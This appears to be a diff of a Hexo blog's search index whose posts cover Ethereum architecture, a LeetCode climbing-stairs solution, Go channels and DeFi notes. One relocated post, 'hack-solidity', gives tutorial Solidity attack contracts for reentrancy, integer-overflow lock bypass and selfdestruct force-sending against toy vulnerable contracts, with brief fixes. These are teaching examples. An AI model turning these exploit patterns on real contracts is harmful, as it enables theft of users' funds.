-<li>数据层 存储以太坊区块链的所有数据 本质是数据库</li>
-<li>网络层 ：P2P网络 在以太坊网络层使用KAD</li>
-<li>共识层：规定通过何种方式实现交易记录的过程 </li>
-<li>激励层： 以太坊采用POW(与比特币的pow不同)实现挖矿奖励机制</li>
-<li>合约层： 平台层 通过合约层开发任意的Dapp 实现完整的区块链系统 在以太坊中 就是evm 和智能合约 </li>
-<li>应用：以太坊的最上层 ，主要使用truffle  web3.js</li>
-</ul>
-<p><img src="/images/web3/eth.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>ETH</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>curve协议</title>
     <url>/2022/03/05/curve/</url>
     <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
@@ -1957,30 +1972,6 @@ eth.getTransaction(xxx)
       </tags>
   </entry>
   <entry>
-    <title>7-0Algorithm.md</title>
-    <url>/2020/06/01/7-0Algorithm-md/</url>
-    <content><![CDATA[<h1 id="爬楼梯"><a href="#爬楼梯" class="headerlink" title="爬楼梯"></a>爬楼梯</h1><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p>
-<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
-<p> </p>
-<p>示例 1：</p>
-<p>输入：n &#x3D; 2<br>输出：2<br>解释：有两种方法可以爬到楼顶。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure>
-
-<p>示例 2：</p>
-<p>输入：n &#x3D; 3<br>输出：3<br>解释：有三种方法可以爬到楼顶。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>来源：力扣（LeetCode）</p>
-</blockquote>
-<p>这种方法的时间复杂度是很高的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func climbStairs(n int) int &#123;</span><br><span class="line">    if n==1 &#123;return 1;&#125;</span><br><span class="line">    if n==2 &#123;return 2;&#125;</span><br><span class="line"></span><br><span class="line">    return climbStairs(n-1) + climbStairs(n-2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-  </entry>
-  <entry>
     <title>go-channel</title>
     <url>/2022/01/26/go-channel/</url>
     <content><![CDATA[<h1 id="go-并发"><a href="#go-并发" class="headerlink" title="go-并发"></a>go-并发</h1><p>java开启线程 需要消耗1MB<br>go 开启协成 需要消耗2KB</p>
@@ -2007,6 +1998,15 @@ eth.getTransaction(xxx)
       <tags>
         <tag>golang</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Yield_Farming_On_Compound</title>
+    <url>/2022/04/10/Yield-Farming-On-Compound/</url>
+    <content><![CDATA[<p><img src="/images/web3/c1.png" alt="image"></p>
+<p><img src="/images/web3/c2.png" alt="image"></p>
+<p><img src="/images/web3/c3.png" alt="image"></p>
+<p><img src="/images/web3/c4.png" alt="image"></p>
+]]></content>
   </entry>
   <entry>
     <title>perpetual</title>
@@ -2232,6 +2232,33 @@ eth.getTransaction(xxx)
       </tags>
   </entry>
   <entry>
+    <title>hack-solidity</title>
+    <url>/2022/02/04/hack-solidity/</url>
+    <content><![CDATA[<h1 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract EtherStore&#123;</span><br><span class="line">     mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line">         balances[msg.sender] +=msg.value;</span><br><span class="line">     &#125;</span><br><span class="line">     function withdraw() public &#123;</span><br><span class="line">         uint bal = balances[msg.sender];</span><br><span class="line">         require(bal &gt;0);</span><br><span class="line">         // 会调用  fallback方法</span><br><span class="line">         (bool send,) = msg.sender.call&#123;value:bal&#125;(&quot;&quot;);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">         require(send,&quot;failed to send ether&quot;);</span><br><span class="line">         balances[msg.sender] = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    EtherStore public etherstore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherstoreAddress)&#123;</span><br><span class="line">        etherstore = EtherStore(_etherstoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        if (address(etherstore).balance &gt;= 1 ether)&#123;</span><br><span class="line">        // 调用</span><br><span class="line">            etherstore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherstore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherstore.withdraw();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用withdraw()之后，一直就调用fallback(),然后调用withdraw(),可以跳过判断</p>
+<h1 id="Arithmetic-overflow-ans-underflow"><a href="#Arithmetic-overflow-ans-underflow" class="headerlink" title="Arithmetic overflow ans underflow"></a>Arithmetic overflow ans underflow</h1><p>uint &#x3D; uint 256 </p>
+<p>$$ 0&lt;&#x3D; x &lt;&#x3D; 2^{256}  -1  $$</p>
+<ul>
+<li>overflow&#x2F;underflow</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt;uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime ;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable&#123;</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] +=msg.value ;</span><br><span class="line"></span><br><span class="line">        lockTime[msg.sender] =now +1 weeks;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _second) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">       require(balances[msg.sender] &gt; 0,&quot;insufficient funds&quot;);</span><br><span class="line">       require(now &gt; lockTime[msg.sender],&quot;  lock time not expired&quot;);</span><br><span class="line">   </span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line"></span><br><span class="line">        (bool successs, )= msg.sender.call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        require(successs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Attack&#123;</span><br><span class="line">     TimeLock timelock;</span><br><span class="line"></span><br><span class="line">     constructor(TimeLock _timelock) public&#123;</span><br><span class="line">         timelock= TimeLock(_timelock);</span><br><span class="line">     &#125;</span><br><span class="line">     // 收款也需要payable </span><br><span class="line">     fallback() external payable&#123;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function attach() public payable&#123;</span><br><span class="line">         timelock.deposit&#123;value:msg.value&#125;();</span><br><span class="line">         //t ==current lock time </span><br><span class="line">         //find x such that </span><br><span class="line">         // x+ t = 2 **256 =0</span><br><span class="line">         // x= -t</span><br><span class="line">         timelock.increaseLockTime(</span><br><span class="line">             uint(-timelock.lockTime(address(this)))</span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">         timelock.withdraw();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
+<li>通过引入安全库。safemath</li>
+</ul>
+<h1 id="Forcefully-send-ether-with-selfdestruct"><a href="#Forcefully-send-ether-with-selfdestruct" class="headerlink" title="Forcefully send ether with selfdestruct"></a>Forcefully send ether with selfdestruct</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract EthGamer&#123;</span><br><span class="line"></span><br><span class="line">     uint public targeAmount = 7 ether;</span><br><span class="line"></span><br><span class="line">     address public winner ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">          require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">          uint balance = address(this).balance;</span><br><span class="line"></span><br><span class="line">          require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">          if(balance==targeAmount)&#123;</span><br><span class="line">              winner= msg.sender;</span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function claimReward() public &#123;</span><br><span class="line"></span><br><span class="line">         require(msg.sender == winner , &quot;not winner&quot;);</span><br><span class="line"></span><br><span class="line">         (bool sent ,) = msg.sender.call&#123;value:address(this).balance&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">         require(sent,&quot;failed&quot;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">   function attack(address payable _target) public payable&#123;</span><br><span class="line"></span><br><span class="line">       selfdestruct(_target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>attack 会调用deposite ,然后会触发winner,结果winner是address:0x0000000000000000000000000000000000000000</p>
+</li>
+<li><p>deposit()方法中加入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint public balance;</span><br><span class="line"></span><br><span class="line">function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">     require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line">     </span><br><span class="line">      balance +=msg.value;</span><br><span class="line"></span><br><span class="line">     require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">     if(balance==targeAmount)&#123;</span><br><span class="line">         winner= msg.sender;</span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="access-private-data"><a href="#access-private-data" class="headerlink" title="access private data"></a>access private data</h1><p>0x3505a02BCDFbb225988161a95528bfDb279faD6b</p>
+]]></content>
+  </entry>
+  <entry>
     <title>手续费</title>
     <url>/2022/04/05/fee/</url>
     <content><![CDATA[<h1 id="手续费"><a href="#手续费" class="headerlink" title="手续费"></a>手续费</h1><ul>
@@ -2411,32 +2438,5 @@ eth.getTransaction(xxx)
       <tags>
         <tag>Uniswap V3</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>hack-solidity</title>
-    <url>/2022/02/04/hack-solidity/</url>
-    <content><![CDATA[<h1 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract EtherStore&#123;</span><br><span class="line">     mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line">         balances[msg.sender] +=msg.value;</span><br><span class="line">     &#125;</span><br><span class="line">     function withdraw() public &#123;</span><br><span class="line">         uint bal = balances[msg.sender];</span><br><span class="line">         require(bal &gt;0);</span><br><span class="line">         // 会调用  fallback方法</span><br><span class="line">         (bool send,) = msg.sender.call&#123;value:bal&#125;(&quot;&quot;);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">         require(send,&quot;failed to send ether&quot;);</span><br><span class="line">         balances[msg.sender] = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    EtherStore public etherstore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherstoreAddress)&#123;</span><br><span class="line">        etherstore = EtherStore(_etherstoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        if (address(etherstore).balance &gt;= 1 ether)&#123;</span><br><span class="line">        // 调用</span><br><span class="line">            etherstore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherstore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherstore.withdraw();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调用withdraw()之后，一直就调用fallback(),然后调用withdraw(),可以跳过判断</p>
-<h1 id="Arithmetic-overflow-ans-underflow"><a href="#Arithmetic-overflow-ans-underflow" class="headerlink" title="Arithmetic overflow ans underflow"></a>Arithmetic overflow ans underflow</h1><p>uint &#x3D; uint 256 </p>
-<p>$$ 0&lt;&#x3D; x &lt;&#x3D; 2^{256}  -1  $$</p>
-<ul>
-<li>overflow&#x2F;underflow</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt;uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime ;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable&#123;</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] +=msg.value ;</span><br><span class="line"></span><br><span class="line">        lockTime[msg.sender] =now +1 weeks;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _second) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">       require(balances[msg.sender] &gt; 0,&quot;insufficient funds&quot;);</span><br><span class="line">       require(now &gt; lockTime[msg.sender],&quot;  lock time not expired&quot;);</span><br><span class="line">   </span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line"></span><br><span class="line">        (bool successs, )= msg.sender.call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        require(successs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Attack&#123;</span><br><span class="line">     TimeLock timelock;</span><br><span class="line"></span><br><span class="line">     constructor(TimeLock _timelock) public&#123;</span><br><span class="line">         timelock= TimeLock(_timelock);</span><br><span class="line">     &#125;</span><br><span class="line">     // 收款也需要payable </span><br><span class="line">     fallback() external payable&#123;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function attach() public payable&#123;</span><br><span class="line">         timelock.deposit&#123;value:msg.value&#125;();</span><br><span class="line">         //t ==current lock time </span><br><span class="line">         //find x such that </span><br><span class="line">         // x+ t = 2 **256 =0</span><br><span class="line">         // x= -t</span><br><span class="line">         timelock.increaseLockTime(</span><br><span class="line">             uint(-timelock.lockTime(address(this)))</span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">         timelock.withdraw();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
-<li>通过引入安全库。safemath</li>
-</ul>
-<h1 id="Forcefully-send-ether-with-selfdestruct"><a href="#Forcefully-send-ether-with-selfdestruct" class="headerlink" title="Forcefully send ether with selfdestruct"></a>Forcefully send ether with selfdestruct</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract EthGamer&#123;</span><br><span class="line"></span><br><span class="line">     uint public targeAmount = 7 ether;</span><br><span class="line"></span><br><span class="line">     address public winner ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">          require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">          uint balance = address(this).balance;</span><br><span class="line"></span><br><span class="line">          require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">          if(balance==targeAmount)&#123;</span><br><span class="line">              winner= msg.sender;</span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function claimReward() public &#123;</span><br><span class="line"></span><br><span class="line">         require(msg.sender == winner , &quot;not winner&quot;);</span><br><span class="line"></span><br><span class="line">         (bool sent ,) = msg.sender.call&#123;value:address(this).balance&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">         require(sent,&quot;failed&quot;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">   function attack(address payable _target) public payable&#123;</span><br><span class="line"></span><br><span class="line">       selfdestruct(_target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>attack 会调用deposite ,然后会触发winner,结果winner是address:0x0000000000000000000000000000000000000000</p>
-</li>
-<li><p>deposit()方法中加入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint public balance;</span><br><span class="line"></span><br><span class="line">function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">     require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line">     </span><br><span class="line">      balance +=msg.value;</span><br><span class="line"></span><br><span class="line">     require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">     if(balance==targeAmount)&#123;</span><br><span class="line">         winner= msg.sender;</span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h1 id="access-private-data"><a href="#access-private-data" class="headerlink" title="access private data"></a>access private data</h1><p>0x3505a02BCDFbb225988161a95528bfDb279faD6b</p>
-]]></content>
   </entry>
 </search>
